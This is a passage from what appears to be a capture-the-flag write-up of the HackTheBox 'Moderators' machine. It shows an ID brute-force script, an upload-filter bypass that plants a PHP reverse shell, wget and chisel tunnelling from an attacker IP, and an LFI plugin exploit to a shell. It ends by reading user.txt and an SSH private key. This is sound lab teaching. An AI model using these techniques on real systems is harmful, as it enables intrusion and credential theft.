background-color: null;
font-weight: bold;
font-style: inherit;">def</span> getUrl(target, md5sum):</span>
<span id="cb11-13">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Send GET request</span></span>
<span id="cb11-14">    url <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> target <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> md5sum <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/"</span></span>
<span id="cb11-15">    req <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> r.get(url)</span>
<span id="cb11-16">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> req.status_code <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">200</span>: <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#and len(req.text) != 0:</span></span>
<span id="cb11-17">        <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Found something on:"</span>, url)</span>
<span id="cb11-18">        storage.append(url)</span>
<span id="cb11-19">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span></span>
<span id="cb11-20">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">else</span>:</span>
<span id="cb11-21">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span></span>
<span id="cb11-22"></span>
<span id="cb11-23"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> createMd5(<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">id</span>):</span>
<span id="cb11-24">    md5sum <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> hashlib.md5(<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">str</span>(<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">id</span>).encode()).hexdigest()</span>
<span id="cb11-25">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span>(md5sum)</span>
<span id="cb11-26">                                                                         </span>
<span id="cb11-27"></span>
<span id="cb11-28"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> main():</span>
<span id="cb11-29">    start <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> time.time()</span>
<span id="cb11-30">    formatter <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">lambda</span> prog: argparse.HelpFormatter(prog,max_help_position<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">70</span>)</span>
<span id="cb11-31">    parser <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> argparse.ArgumentParser(formatter_class<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>formatter)</span>
<span id="cb11-32">    parser.add_argument(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-t'</span>,<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'--target'</span>, <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">str</span>, <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">help</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'target url'</span>)</span>
<span id="cb11-33">    parser.add_argument(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-s'</span>,<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'--start'</span>, <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">int</span>, <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">help</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'start id'</span>)</span>
<span id="cb11-34">    parser.add_argument(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-e'</span>,<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'--end'</span>, <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">int</span>, <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">help</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'end id'</span>)</span>
<span id="cb11-35">    args <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> parser.parse_args()</span>
<span id="cb11-36"></span>
<span id="cb11-37">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Loop through start to end</span></span>
<span id="cb11-38">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">for</span> i <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">range</span>(args.start, args.end):</span>
<span id="cb11-39">        <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Testing nr."</span>, i)</span>
<span id="cb11-40">        md5sum <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> createMd5(i)</span>
<span id="cb11-41">        getUrl(args.target, md5sum)</span>
<span id="cb11-42"></span>
<span id="cb11-43">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Print all results stored in 'storage'</span></span>
<span id="cb11-44">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">not</span> storage:</span>
<span id="cb11-45">        <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Nothing found.."</span>)</span>
<span id="cb11-46">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">else</span>:</span>
<span id="cb11-47">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">for</span> i <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">range</span>(<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">len</span>(storage)):</span>
<span id="cb11-48">            <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Results"</span>, i, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"-"</span>, storage[i])</span>
<span id="cb11-49"></span>
<span id="cb11-50">    end <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> time.time()</span>
<span id="cb11-51">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"time elapsed:"</span>, end <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span> start, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"seconds"</span>)</span>
<span id="cb11-52"></span>
<span id="cb11-53">    </span>
<span id="cb11-54"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">__name__</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"__main__"</span>:</span>
<span id="cb11-55">    main()</span></code></pre></div>
<p>Sadly running the script with start 1 and end 10000 doesn’t give us anything that we already knew..</p>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators python3 findLogs.py <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-t</span> http://moderators.htb/logs/ <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-s</span> 1 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-e</span> 10000</span>
<span id="cb12-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Testing</span> nr. 1</span>
<span id="cb12-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb12-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Testing</span> nr. 9999</span>
<span id="cb12-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Results</span> 0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/</span>
<span id="cb12-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Results</span> 1 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> http://moderators.htb/logs/b071cfa81605a94ad80cfa2bbc747448/</span>
<span id="cb12-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Results</span> 2 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> http://moderators.htb/logs/74d90aafda34e6060f9e8433962d14fd/</span>
<span id="cb12-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Results</span> 3 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> http://moderators.htb/logs/ce5d75028d92047a9ec617acb9c34ce6/</span>
<span id="cb12-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Results</span> 4 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> http://moderators.htb/logs/afecc60f82be41c1b52f6705ec69e0f1/</span>
<span id="cb12-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Results</span> 5 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> http://moderators.htb/logs/e21cece511f43a5cb18d4932429915ed/</span>
<span id="cb12-11"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">time</span> elapsed: 435.2408220767975 seconds</span></code></pre></div>
<p>Continue to enumerate the found URLs with <code>ffuf</code>, and we find pdfs!</p>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/FUZZ.pdf</span>
<span id="cb13-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">logs</span>                    [Status: 200, Size: 15187, Words: 776, Lines: 239, Duration: 38ms]</span>
<span id="cb13-3"></span>
<span id="cb13-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://moderators.htb/logs/b071cfa81605a94ad80cfa2bbc747448/FUZZ.pdf</span>
<span id="cb13-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">logs</span>                    [Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 29ms]</span>
<span id="cb13-6"></span>
<span id="cb13-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://moderators.htb/logs/74d90aafda34e6060f9e8433962d14fd/FUZZ.pdf</span>
<span id="cb13-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">logs</span>                    [Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 65ms]</span>
<span id="cb13-9"></span>
<span id="cb13-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://moderators.htb/logs/ce5d75028d92047a9ec617acb9c34ce6/FUZZ.pdf</span>
<span id="cb13-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">logs</span>                    [Status: 200, Size: 15042, Words: 771, Lines: 239, Duration: 36ms]</span>
<span id="cb13-12"></span>
<span id="cb13-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://moderators.htb/logs/afecc60f82be41c1b52f6705ec69e0f1/FUZZ.pdf</span>
<span id="cb13-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">logs</span>                    [Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 30ms]</span>
<span id="cb13-15"></span>
<span id="cb13-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://moderators.htb/logs/e21cece511f43a5cb18d4932429915ed/FUZZ.pdf</span>
<span id="cb13-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">logs</span>                    [Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 31ms]</span></code></pre></div>
<p>Download all the <code>log.pfd</code> files:</p>
<div class="sourceCode" id="cb14" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators curl http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/logs.pdf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-o</span> 2589-logs.pdf</span>
<span id="cb14-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators curl http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/logs.pdf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-o</span> 3478-logs.pdf</span>
<span id="cb14-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators curl http://moderators.htb/logs/74d90aafda34e6060f9e8433962d14fd/logs.pdf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-o</span> 4221-logs.pdf</span>
<span id="cb14-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators curl http://moderators.htb/logs/ce5d75028d92047a9ec617acb9c34ce6/logs.pdf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-o</span> 7612-logs.pdf</span>
<span id="cb14-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators curl http://moderators.htb/logs/afecc60f82be41c1b52f6705ec69e0f1/logs.pdf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-o</span> 8121-logs.pdf</span>
<span id="cb14-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators curl http://moderators.htb/logs/e21cece511f43a5cb18d4932429915ed/logs.pdf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-o</span> 9798-logs.pdf</span></code></pre></div>
<p><img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators02.png" class="img-fluid"></p>
<p>We find even more new paths, <code>/logs/report_log_upload.php</code>, a file upload!</p>
<p><img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators03.png" class="img-fluid"></p>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>Trying to upload a php webshell is revoked with the text <em>“Only PDF files are allowed!”</em>, maybe we can bypass this with burp or maybe upload a malicious PDF.</p>
<p>Playing around with the function we can confirm that we’re able to upload PDF files: <img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators04.png" class="img-fluid"></p>
<p>We are not able to bypass the restriction by changing MIME type and/or file extension: <img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators05.png" class="img-fluid"></p>
<p>However we are able to bypass it by adding <code>%PDF-1.5</code> at the start of our payload, changing extension to <code>.pdf.php</code> and MIME type to <code>application/pdf</code>: <img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators06.png" class="img-fluid"></p>
<p>Browsing to the uploaded file, <code>http://moderators.htb/logs/uploaded/&lt;filename&gt;</code>, we quickly realize that our mini RCE doesn’t work..</p>
<p><img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators07.png" class="img-fluid"></p>
<p>Instead of going for a webshell, lets go for a php reverse shell right away. The one from <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">Pentestmonkey</a> is usually my go to, and the one used here. <img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators08.png" class="img-fluid"></p>
</section>
<section id="step-4" class="level3">
<h3 class="anchored" data-anchor-id="step-4">Step 4</h3>
<p>Enumerate the box manually as user <code>www-data</code>. - We’re unable to run any commands as sudo - <code>sudo -l</code> - In <code>/home/</code> we find two users - <code>john</code> and <code>lexi</code> - We got read and execute privileges in <code>lexi</code>’s home directory, however we’re unable to read <code>user.txt</code> and/or any file in <code>.ssh</code></p>
<div class="sourceCode" id="cb15" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwx---</span>  7 john john 4096 Jul 14 15:51 john</span>
<span id="cb15-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span>  5 lexi lexi 4096 Jul 14 10:50 lexi</span></code></pre></div>
<ul>
<li>MySQL is running locally on port 3306, however we don’t have any credentials to login, yet. And a local webserver (I guess) is running on port 8080</li>
</ul>
<div class="sourceCode" id="cb16" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Proto</span> Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span>
<span id="cb16-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:3306          0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb16-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:8080          0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb16-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.53:53           0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>    </span></code></pre></div>
<ul>
<li>There is nothing of use in <code>/var/www/html</code></li>
<li>We find what seems to be a new version of the site under <code>/opt/site.new/</code>
<ul>
<li>We’re unable to read <code>wp-config.php</code></li>
<li>There are two installed plugins, <code>brandfolder</code> &amp; <code>passwords-manager</code>, found under <code>/opt/site.new/wp-content/plugins</code></li>
</ul></li>
<li>Running <code>ps aux</code> we can see that user <code>lexi</code> runs a script (<code>/usr/local/sbin/startup.sh</code>) to start the webserver in <code>/opt/site.new/</code></li>
</ul>
<div class="sourceCode" id="cb17" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> ps aux</span>
<span id="cb17-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span>         822  0.0  0.0   8368  3748 <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span>        Ss   07:20   0:00 /usr/sbin/runuser <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> lexi /usr/local/sbin/startup.sh</span>
<span id="cb17-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lexi</span>         865  0.0  0.0   2608   596 <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span>        S    07:20   0:00 /bin/sh /usr/local/sbin/startup.sh</span>
<span id="cb17-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lexi</span>         866  0.0  0.7 228360 31740 <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span>        S    07:20   0:00 /usr/bin/php <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-S</span> 127.0.0.1:8080 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-t</span> /opt/site.new/</span>
<span id="cb17-5"></span>
<span id="cb17-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> cat /usr/local/sbin/startup.sh</span>
<span id="cb17-7"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#!/bin/sh</span></span>
<span id="cb17-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/bin/php</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-S</span> 127.0.0.1:8080 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-t</span> /opt/site.new/</span></code></pre></div>
<p>Upload <code>chisel</code> and setup a tunnel to start enumerate the local webservice. <strong>Note:</strong> Port 8080 collides with my proxy settings, so I need to close this before setting up chisel.</p>
<div class="sourceCode" id="cb18" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb18-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Start server locally</span></span>
<span id="cb18-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  chisel_1.7.7 ./chisel_1.7.7_linux_amd64 server <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> 4444 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-reverse</span></span>
<span id="cb18-3"></span>
<span id="cb18-4"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Upload and run chisel client</span></span>
<span id="cb18-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@moderators:/dev/shm$</span> wget http://10.10.14.5/chisel_1.7.7_linux_amd64</span>
<span id="cb18-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@moderators:/dev/shm$</span> chmod +x chisel_1.7.7_linux_amd64</span>
<span id="cb18-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@moderators:/dev/shm$</span> ./chisel_1.7.7_linux_amd64 client 10.10.14.5:4444 R:8080:127.0.0.1:8080</span>
<span id="cb18-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/09/05</span> 08:34:41 client: Connecting to ws://10.10.14.5:4444</span>
<span id="cb18-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/09/05</span> 08:34:41 client: Connected <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Latency</span> 27.873433ms<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p>The new site is a total mess, probably because it refers to <code>moderators.htb</code> which I’m to lazy to fix in <code>/etc/hosts</code>. <img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators09.png" class="img-fluid"></p>
</section>
<section id="step-5" class="level3">
<h3 class="anchored" data-anchor-id="step-5">Step 5</h3>
<p>Googling around we find that the plugin <code>brandfolder</code> have a <a href="https://www.exploit-db.com/exploits/39591">LFI/RFI vulnerability</a>, we should be able to exploit this to run commands as user <code>lexi</code>.</p>
<p>Copy a new php reverse shell to <code>/dev/shm/</code>, name it to <code>wp-load.php</code> as per instructions and browse to <code>http://127.0.0.1:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/dev/shm/</code> to trigger the reverse shell. And yes, the chisel tunnel needs to be up and running when triggering the reverse shell.</p>
<div class="sourceCode" id="cb19" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@moderators:/dev/shm$</span> mv rev.php wp-load.php</span>
<span id="cb19-2"></span>
<span id="cb19-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 4499</span>
<span id="cb19-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 4499 ...</span>
<span id="cb19-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.5</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.10.11.173]</span> 37260</span>
<span id="cb19-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> id <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">hostname</span></span>
<span id="cb19-7"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1001<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lexi</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1001<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lexi</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1001<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lexi</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,1002</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">moderators</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb19-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">moderators</span></span>
<span id="cb19-9"></span>
<span id="cb19-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> cat user.txt <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> .ssh/id_rsa</span>
<span id="cb19-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">abbfc3e262e116c1559b3a2a97bdc041</span></span>
<span id="cb19-12"><span class="ex" style="color: null;
background-color: null;
